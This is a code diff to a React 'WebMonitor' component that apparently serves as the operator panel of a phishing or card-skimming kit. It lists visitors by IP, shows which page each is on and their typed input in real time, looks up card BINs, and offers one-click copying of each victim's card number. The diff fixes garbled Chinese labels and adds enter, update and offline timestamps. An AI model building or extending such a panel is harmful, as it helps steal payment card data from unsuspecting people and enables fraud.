@@ -191,7 +191,7 @@ const submissionData: UserSubmission[] = [
     dataSize: "1.2Mb",
     fieldsCount: 15,
     ipAddress: "192.168.1.88"
-    // 没有 binLookup 和 realtimeInput，表示用��还未输入数据
+    // 没有 binLookup 和 realtimeInput，表示用户还未输入数据
   },
   {
     id: "13800",
@@ -333,6 +333,27 @@ export function WebMonitor() {
                     <span className="text-sm text-muted-foreground">正在某个页面:</span>
                     <span className="text-sm font-medium text-blue-600 border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">{submission.currentPage}</span>
                   </div>
+
+                  {submission.enterTime && (
+                    <div className="flex items-center gap-1">
+                      <span className="text-sm text-muted-foreground">进入时间:</span>
+                      <span className="text-sm font-medium border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">{submission.enterTime}</span>
+                    </div>
+                  )}
+
+                  {submission.updateTime && (
+                    <div className="flex items-center gap-1">
+                      <span className="text-sm text-muted-foreground">更新时间:</span>
+                      <span className="text-sm font-medium border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">{submission.updateTime}</span>
+                    </div>
+                  )}
+
+                  {submission.isOffline && submission.offlineTime && (
+                    <div className="flex items-center gap-1">
+                      <span className="text-sm text-muted-foreground">离线时间:</span>
+                      <span className="text-sm font-medium border border-red-300/50 rounded px-2 py-1 bg-red-50/10 text-red-600">{submission.offlineTime}</span>
+                    </div>
+                  )}
                 </div>
 
                 <div className="flex gap-1.5">
@@ -502,7 +523,7 @@ export function WebMonitor() {
                           : 'border-gray-300 bg-gray-50'
                       }`}
                       onClick={() => copyToClipboard(getFieldValue(submission.id, 'cardNumber'))}
-                      title="���击复制卡号"
+                      title="点击复制卡号"
                     >
                       <span className="relative">
                         {getFieldValue(submission.id, 'cardNumber')}
@@ -549,7 +570,7 @@ export function WebMonitor() {
                 ) : (
                   <div className="flex items-center justify-center py-4 mb-0.5">
                     <div className="text-sm text-muted-foreground italic">
-                      等��用户输入数据...
+                      等待用户输入数据...
                     </div>
                   </div>
                 );
